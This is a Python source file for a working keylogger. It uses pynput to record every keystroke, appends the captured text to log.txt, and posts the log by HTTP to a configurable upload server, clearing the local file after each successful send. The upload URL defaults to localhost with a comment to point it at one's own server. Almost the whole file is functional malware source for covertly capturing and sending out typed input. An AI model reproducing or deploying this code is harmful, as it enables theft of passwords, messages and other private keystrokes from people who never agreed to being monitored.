from typing import List
import requests
from pynput.keyboard import Key, Listener

# Global variables to store key logs
char_count = 0
saved_keys = []
API_URL = "http://localhost:5000/upload"  # Adjust based on your server setup

def on_key_press(key: str):
    """
    Callback function that gets executed when a key is pressed.
    Prints the pressed key to the console.
    """
    try:
        print("Key Pressed: ", key)
    except Exception as ex:
        print("There was an error: ", ex)

def on_key_release(key):
    """
    Callback function that gets executed when a key is released.
    Handles writing to a file when Enter or Space is pressed.
    Stops logging when the Escape key is pressed.
    """
    global saved_keys, char_count

    if key == Key.esc:  # Stop key logging if Escape key is pressed
        send_log_to_server()  # Send logs before stopping
        return False
    else:
        if key == Key.enter:  # If Enter key is pressed, write keys to file
            write_to_file(saved_keys)
            send_log_to_server()  # Send logs after writing
            char_count = 0
            saved_keys = []

        elif key == Key.space:
            key = " "  # Replace with actual space character
            write_to_file(saved_keys)
            send_log_to_server()
            saved_keys = []
            char_count = 0

        saved_keys.append(key)
        char_count += 1

def write_to_file(keys: List[str]):
    """
    Writes recorded keystrokes to a log file ('log.txt').
    Filters out keys that contain the word 'key' (e.g., Key.shift).
    """
    with open("log.txt", "a") as file:
        for key in keys:
            key = str(key).replace("'", "")

            if "key".upper() not in key.upper():
                file.write(key)

        file.write("\n")

def send_log_to_server():
    """
    Sends the contents of 'log.txt' to the API server.
    """
    try:
        with open("log.txt", "r") as file:
            log_data = file.read()

        if log_data.strip():  # Send only if log is not empty
            response = requests.post(API_URL, json={"log": log_data})
            if response.status_code == 200:
                print("Log successfully sent to the server.")
                open("log.txt", "w").close()  # Clear the file after sending
            else:
                print(f"Failed to send log. Status code: {response.status_code}")
    except Exception as e:
        print("Error sending log to server:", e)

# Start the keylogger using the Listener
with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    print("Start key logging...")
    listener.join()
    print("End key logging...")
